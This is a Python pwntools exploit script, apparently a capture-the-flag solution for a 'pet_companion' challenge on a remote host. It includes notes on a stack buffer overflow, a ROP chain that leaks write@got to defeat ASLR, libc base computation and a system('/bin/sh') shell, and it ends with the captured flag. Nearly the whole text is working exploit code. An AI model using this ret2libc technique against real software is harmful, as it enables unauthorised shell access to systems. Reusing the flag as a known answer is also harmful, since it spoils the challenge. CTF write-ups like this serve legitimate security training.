#!/usr/bin/env python3

import pwn
import time

elf = pwn.ELF('./pet_companion')
pwn.context.binary = elf
pwn.context.log_level = 'debug'

libc = pwn.ELF('./glibc/libc.so.6')

#p = elf.process()
p = pwn.remote('83.136.254.221',35998)

rop = pwn.ROP(elf)
rop.write(1,elf.got.write) #call write() , 1 is file descriptor for stdout and print elf.got.write
rop.main() # return to main

padding = 72

p.sendlineafter(b'status',padding*b'A'+rop.chain())

p.recvuntil("Configuring...\n\n")
write_leak = pwn.u64(p.recv(6).ljust(8,b"\x00")) # it only writes out 6bytes so we justify it to 8 bytes so its a full address then unpack it
print(f"{hex(write_leak)=}")

libc.address = write_leak - libc.symbols['write']

rop = pwn.ROP(libc)
rop.system(next(libc.search(b"/bin/sh\x00")))
p.sendlineafter(b"status",padding*b'A'+rop.chain())

p.interactive()



'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'

Buffer size 64 bytes but it is reading in 0x100(256) bytes so we have a buffer overflow. No interesting function we have to return to so most likely return to libc
in gdb
# r
# ctrl + c
# p system       $1 = {<text variable, no debug info>} 0x7ffff784f420 <system>
but we wont know that address because of ASLR during execution
# vmmap

Couple of libc address are linked in to our main binary when the process starts and these are got and plt 
# got -r
[0x600fd8] write@GLIBC_2.2.5 -> 0x7ffff79100f0 (write) ◂— lea rax, [rip + 0x2e08e1]
[0x600fe0] read@GLIBC_2.2.5 -> 0x7ffff7910020 (read) ◂— lea rax, [rip + 0x2e09b1]
[0x600fe8] setvbuf@GLIBC_2.2.5 -> 0x7ffff78812a0 (setvbuf) ◂— push r13

so at address 0x600fd8, this is a known address which will always be the same there exists value 0x7ffff79100f0 which is the libc address for write

# x/gx 0x600fd8               0x600fd8 <write@got.plt>:	0x00007ffff79100f0
# x/gx 0x7ffff79100f0         0x7ffff79100f0 <write>:	0x8b002e08e1058d48

We will write a ROP payload to leaks value then jump back to main again cause of program restarts then due to ASLR the addresses of libc will change again

flag : HTB{c0nf1gur3_w3r_d0g}
'''
